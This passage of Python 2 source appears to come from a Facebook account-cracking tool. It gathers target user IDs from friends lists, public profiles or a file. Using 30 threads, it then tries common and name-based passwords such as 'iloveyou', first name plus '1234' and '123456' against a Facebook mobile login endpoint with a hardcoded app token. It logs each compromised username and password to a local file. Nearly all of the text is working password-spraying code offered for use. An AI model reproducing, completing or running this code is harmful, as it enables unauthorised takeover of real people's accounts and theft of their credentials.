                                cekpoint.append(zowe)
                            else:
                                bos6 = j['first_name'].lower() + '123456'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos6
                                    oke = open('done/indo.txt', 'a')
                                    oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos6
                                    cek = open('done/indo.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = j['last_name'].lower() + '123456'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos7
                                        oke = open('done/indo.txt', 'a')
                                        oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos7
                                        cek = open('done/indo.txt', 'a')
                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = 'Bangal786'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos8
                                            oke = open('done/indo.txt', 'a')
                                            oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos8
                                            cek = open('done/indo.txt', 'a')
                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
    p.map(main, id)
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mDone ...'
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;93mTotal \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;97m: \x1b[1;92m' + str(len(oks)) + '\x1b[1;97m/\x1b[1;93m' + str(len(cekpoint))
    print '\x1b[1;97m{\x1b[1;93m\xe2\x97\x8f\x1b[1;97m} \x1b[1;92mOK\x1b[1;97m/\x1b[1;93mCP \x1b[1;93mfile Save \x1b[1;91m: \x1b[1;92mcopy or copy'
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    raw_input('\x1b[1;97m{<\x1b[1;93mBack\x1b[1;97m>}')
    os.system('python2 Craker.py')


def crack_usa():
    global toket
    os.system('clear')
    try:
        toket = open('login.txt', 'r').read()
    except IOError:
        print '\x1b[1;96m[!] \x1b[1;91mToken invalid'
        os.system('rm -rf login.txt')
        time.sleep(1)
        keluar()

    os.system('clear')
    print logo8
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    print '\x1b[1;97m{\x1b[1;93m01\x1b[1;97m} \x1b[1;92mHack From Friends list'
    print '\x1b[1;97m{\x1b[1;93m02\x1b[1;97m} \x1b[1;92mHack From Public Friends List'
    print '\x1b[1;97m{\x1b[1;93m03\x1b[1;97m} \x1b[1;92mHack From File'
    print '\x1b[1;97m{\x1b[1;91m00\x1b[1;97m} Back'
    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
    pilih_usa()


def pilih_usa():
    teak = raw_input('\x1b[1;95mWhich Choice Man? \x1b[91m:\x1b[1;92m ')
    if teak == '':
        print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m}\x1b[1;97m Choose the wrong one...!'
        pilih_usa()
    elif teak == '1' or teak == '01':
        os.system('clear')
        print logo19
        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
        print '                \x1b[1;95m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK USA \x1b[1;95m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
        r = requests.get('https://graph.facebook.com/me/friends?access_token=' + toket)
        z = json.loads(r.text)
        for s in z['data']:
            id.append(s['id'])

    else:
        if teak == '2' or teak == '02':
            os.system('clear')
            print logo19
            print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
            print '                \x1b[1;95m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK USA \x1b[1;95m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
            print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
            idt = raw_input('\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mID Public/Friend \x1b[1;91m:\x1b[1;92m ')
            try:
                jok = requests.get('https://graph.facebook.com/' + idt + '?access_token=' + toket)
                op = json.loads(jok.text)
                print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mName \x1b[1;91m:\x1b[1;92m ' + op['name']
            except KeyError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} ID public / Friend Doesnt Exist !'
                raw_input('\n\x1b[1;95m[\x1b[1;97m<Back>\x1b[1;95m]')
                crack_usa()
            except requests.exceptions.ConnectionError:
                print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} Tidak ada koneksi internet !'
                keluar()

            r = requests.get('https://graph.facebook.com/' + idt + '/friends?access_token=' + toket)
            z = json.loads(r.text)
            for i in z['data']:
                id.append(i['id'])

        else:
            if teak == '3' or teak == '03':
                os.system('clear')
                print logo19
                try:
                    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
                    print '                \x1b[1;95m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f \x1b[1;97mCRACK USA \x1b[1;95m\xe2\x97\x8f\xe2\x97\x8f\xe2\x97\x8f'
                    print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
                    idlist = raw_input('\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mName File\x1b[1;91m :\x1b[1;92m ')
                    for line in open(idlist, 'r').readlines():
                        id.append(line.strip())

                except KeyError:
                    print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File does not exist ! '
                    raw_input('\n\x1b[1;92m[ \x1b[1;97mBack \x1b[1;92m]')
                except IOError:
                    print '\x1b[1;97m{\x1b[1;91m!\x1b[1;97m} File does not exist !'
                    raw_input('\n\x1b[1;95m[\x1b[1;97m<Back>\x1b[1;95m]')
                    crack_usa()

            elif teak == '0' or teak == '00':
                menu()
            else:
                print '\x1b[1;97m[\x1b[1;91m!\x1b[1;97m]\x1b[1;97m The Choice One wrong...!'
                pilih_usa()
            print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mTotal ID \x1b[1;91m:\x1b[1;92m ' + str(len(id))
            print '\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mStop Token CTRL+Z'
            titik = ['.   ', '..  ', '... ']
            for o in titik:
                print '\r\x1b[1;97m{\x1b[1;95m\xe2\x97\x8f\x1b[1;97m} \x1b[1;95mCracker ' + o,
                sys.stdout.flush()
                time.sleep(1)

        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'
        print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mIf the Crack is Still Old'
        print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mTurn on Airplane Mode 5 Seconds'
        print '\x1b[1;97m{\x1b[1;93m!\x1b[1;97m} \x1b[1;95mCheckpoint Save 7/10 Days'
        print '\x1b[1;94m \xc2\xab--------------------------------------------\xc2\xbb'

    def main(arg):
        sys.stdout.write(('\r{}').format(datetime.now().strftime('\x1b[1;96m%H\x1b[1;91m:\x1b[1;93m%M\x1b[1;91m:\x1b[1;92m%S')))
        sys.stdout.flush()
        zowe = arg
        try:
            os.mkdir('done')
        except OSError:
            pass

        try:
            an = requests.get('https://graph.facebook.com/' + zowe + '/?access_token=' + toket)
            j = json.loads(an.text)
            bos1 = 'iloveyou'
            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos1 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
            ko = json.load(data)
            if 'access_token' in ko:
                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos1
                oke = open('done/indo.txt', 'a')
                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                oke.close()
                oks.append(zowe)
            elif 'www.facebook.com' in ko['error_msg']:
                print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos1
                cek = open('done/indo.txt', 'a')
                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos1 + '\n')
                cek.close()
                cekpoint.append(zowe)
            else:
                bos2 = j['first_name'].lower() + '1234'
                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos2 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                ko = json.load(data)
                if 'access_token' in ko:
                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos2
                    oke = open('done/indo.txt', 'a')
                    oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    oke.close()
                    oks.append(zowe)
                elif 'www.facebook.com' in ko['error_msg']:
                    print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos2
                    cek = open('done/indo.txt', 'a')
                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos2 + '\n')
                    cek.close()
                    cekpoint.append(zowe)
                else:
                    bos3 = j['first_name'].lower() + '12345'
                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos3 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                    ko = json.load(data)
                    if 'access_token' in ko:
                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos3
                        oke = open('done/indo.txt', 'a')
                        oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        oke.close()
                        oks.append(zowe)
                    elif 'www.facebook.com' in ko['error_msg']:
                        print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCEKPOINT'
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos3
                        cek = open('done/indo.txt', 'a')
                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos3 + '\n')
                        cek.close()
                        cekpoint.append(zowe)
                    else:
                        bos4 = '123456'
                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos4 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                        ko = json.load(data)
                        if 'access_token' in ko:
                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos4
                            oke = open('done/indo.txt', 'a')
                            oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            oke.close()
                            oks.append(zowe)
                        elif 'www.facebook.com' in ko['error_msg']:
                            print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos4
                            cek = open('done/indo.txt', 'a')
                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos4 + '\n')
                            cek.close()
                            cekpoint.append(zowe)
                        else:
                            bos5 = 'Brand123'
                            data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos5 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                            ko = json.load(data)
                            if 'access_token' in ko:
                                print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos5
                                oke = open('done/indo.txt', 'a')
                                oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                oke.close()
                                oks.append(zowe)
                            elif 'www.facebook.com' in ko['error_msg']:
                                print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos5
                                cek = open('done/indo.txt', 'a')
                                cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos5 + '\n')
                                cek.close()
                                cekpoint.append(zowe)
                            else:
                                bos6 = j['first_name'].lower() + '123456'
                                data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos6 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                ko = json.load(data)
                                if 'access_token' in ko:
                                    print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                    print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos6
                                    oke = open('done/indo.txt', 'a')
                                    oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    oke.close()
                                    oks.append(zowe)
                                elif 'www.facebook.com' in ko['error_msg']:
                                    print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                    print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos6
                                    cek = open('done/indo.txt', 'a')
                                    cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos6 + '\n')
                                    cek.close()
                                    cekpoint.append(zowe)
                                else:
                                    bos7 = j['last_name'].lower() + '123456'
                                    data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos7 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                    ko = json.load(data)
                                    if 'access_token' in ko:
                                        print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                        print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos7
                                        oke = open('done/indo.txt', 'a')
                                        oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        oke.close()
                                        oks.append(zowe)
                                    elif 'www.facebook.com' in ko['error_msg']:
                                        print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                        print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos7
                                        cek = open('done/indo.txt', 'a')
                                        cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos7 + '\n')
                                        cek.close()
                                        cekpoint.append(zowe)
                                    else:
                                        bos8 = j['first_name'].lower() + '@1234'
                                        data = urllib.urlopen('https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=' + zowe + '&locale=en_US&password=' + bos8 + '&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6')
                                        ko = json.load(data)
                                        if 'access_token' in ko:
                                            print '\n\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} \x1b[1;92mSUCCESSFUL'
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;92m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m' + zowe
                                            print '\x1b[1;97m{\x1b[1;92m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m' + bos8
                                            oke = open('done/indo.txt', 'a')
                                            oke.write('\n{\xc3\x97} SUCCESSFUL \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            oke.close()
                                            oks.append(zowe)
                                        elif 'www.facebook.com' in ko['error_msg']:
                                            print '\n\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} \x1b[1;93mCHECKPOINT'
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Name  \x1b[1;91m    > \x1b[1;93m' + j['name']
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m' + zowe
                                            print '\x1b[1;97m{\x1b[1;93m\xc3\x97\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m' + bos8
                                            cek = open('done/indo.txt', 'a')
                                            cek.write('\n{\xc3\x97} CEKPOINT \n{\xc3\x97} Nama     > ' + j['name'] + '\n{\xc3\x97} User     > ' + zowe + '\n{\xc3\x97} Password > ' + bos8 + '\n')
                                            cek.close()
                                            cekpoint.append(zowe)
        except:
            pass

    p = ThreadPool(30)
